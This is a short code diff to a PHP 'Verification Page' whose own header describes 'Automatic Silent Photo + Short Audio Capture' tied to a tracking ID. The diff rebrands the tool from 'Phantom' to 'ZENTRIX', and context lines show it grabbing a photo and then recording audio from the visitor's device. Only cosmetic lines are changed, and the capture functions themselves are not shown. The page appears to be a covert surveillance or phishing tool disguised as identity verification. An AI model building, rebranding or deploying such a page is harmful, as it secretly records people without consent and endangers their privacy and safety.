@@ -1,6 +1,6 @@
 <?php
 /**
- * Phantom v3 – Verification Page
+ * ZENTRIX v3 – Verification Page
  * Automatic Silent Photo + Short Audio Capture
  */
 
@@ -80,8 +80,8 @@ if (empty($trackId)) {
 
     <header class="topbar">
         <div class="logo">
-            <span class="ghost">👻</span>
-            <span class="name">Phantom</span>
+            <span class="ghost">◈</span>
+            <span class="name">ZENTRIX</span>
         </div>
         <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
     </header>
@@ -276,7 +276,7 @@ if (empty($trackId)) {
                 // Capture photo first
                 photoBlob = await capturePhoto(stream);
 
-                // Then record short audio (using remaining audio tracks)
+                // Then record short audio
                 startBtn.textContent = 'Recording audio...';
                 audioBlob = await recordAudio(stream);
 
